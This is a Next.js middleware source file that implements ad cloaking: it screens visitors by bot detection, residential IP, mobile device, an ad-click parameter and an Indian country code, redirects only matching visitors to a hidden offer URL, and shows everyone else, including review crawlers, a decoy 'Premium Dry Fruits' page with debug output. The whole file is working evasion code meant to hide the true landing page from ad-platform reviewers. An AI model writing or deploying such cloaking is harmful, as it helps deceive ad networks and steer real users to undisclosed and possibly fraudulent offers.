// src/middleware.ts
import { NextRequest, NextResponse } from 'next/server';
import { detectUserAgent, isMobile, hasAdIntent } from './lib/detection';
import { getIpAddress, analyzeIp } from './lib/ip-analyzer';

const OFFER_URL = process.env.OFFER_URL || 'https://example.com';

// --- CLOAKED PAGE HTML (Dry Fruit) ---
// Agar Redirect fail hoga toh isme Reason dikha jayega
const getCloakedHTML = (reason: string) => {
  const debugColor = reason.includes('FAIL') ? '#e74c3c' : '#27ae60';
  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Dry Fruits</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; background: #f4f4f4; text-align: center; padding: 20px; }
        .card { background: #fff; max-width: 500px; margin: 40px auto; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h1 { color: #333; margin-bottom: 5px; }
        .status-box { background: #f9f9f9; border: 1px solid #ddd; padding: 10px; margin: 20px 0; text-align: left; border-radius: 8px; font-size: 13px; font-family: monospace; }
        .status-line { display: flex; justify-content: space-between; margin-bottom: 4px; }
        .label { font-weight: bold; color: #555; }
        .val { color: #000; }
        .fail { color: #e74c3c; font-weight: bold; }
        .pass { color: #27ae60; font-weight: bold; }
        .price { font-size: 28px; color: #27ae60; font-weight: bold; margin: 15px 0; }
        .footer { font-size: 12px; color: #888; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <h1>Premium Dry Fruits</h1>
        <div class="price">₹279</div>
        
        <!-- DEBUG AREA: Reason dikhega -->
        <div class="status-box">
            <strong>🕵️‍♂️ Logic Check:</strong>
            ${Array.isArray(reason) ? reason.map(line => `<div class="status-line"><span class="label">${line.split(':')[0].trim()}: </span><span class="val ${line.includes('PASS') ? 'pass' : 'fail'}">${line.split(':')[1]}</span></div>`).join('') : ''}
        </div>

        <p>Secure Payment | Fast Delivery</p>
        <div class="footer">Privacy | Terms | Contact</div>
    </div>
</body>
</html>
`;
};

export async function middleware(request: NextRequest) {
  const ip = getIpAddress(request);
  const ua = request.headers.get('user-agent') || '';
  const { searchParams } = new URL(request.url);

  // 1. Bot Check
  const bot = detectUserAgent(ua);
  if (bot.isBot) return new Response(getCloakedHTML([`Bot Detected: ${bot.reason}`]), { status: 200, headers: { 'Content-Type': 'text/html' } });

  // 2. IP Analysis
  const { isResidential, countryCode } = await analyzeIp(ip);

  // 3. Target Checks
  const isUserMobile = isMobile(ua);
  const isAdClick = hasAdIntent(request);
  const isIndia = countryCode === 'IN';

  // --- STATUS LOGS ---
  const logs = [
    `Country: ${countryCode} ${isIndia ? '✅' : '❌'}`,
    `Residential IP: ${isResidential} ${isResidential ? '✅' : '❌'}`,
    `Mobile Device: ${isUserMobile} ${isUserMobile ? '✅' : '❌'}`,
    `Ad Link Param: ${isAdClick} ${isAdClick ? '✅' : '❌'}`
  ];

  // --- REDIRECT LOGIC ---
  if (isResidential && isUserMobile && isAdClick && isIndia) {
    return NextResponse.redirect(new URL(OFFER_URL, request.url));
  }

  // If failed, show Reason on Page
  return new Response(getCloakedHTML(logs), {
    status: 200,
    headers: { 'Content-Type': 'text/html; charset=UTF-8' }
  });
}

export const config = { matcher: ['/'] };
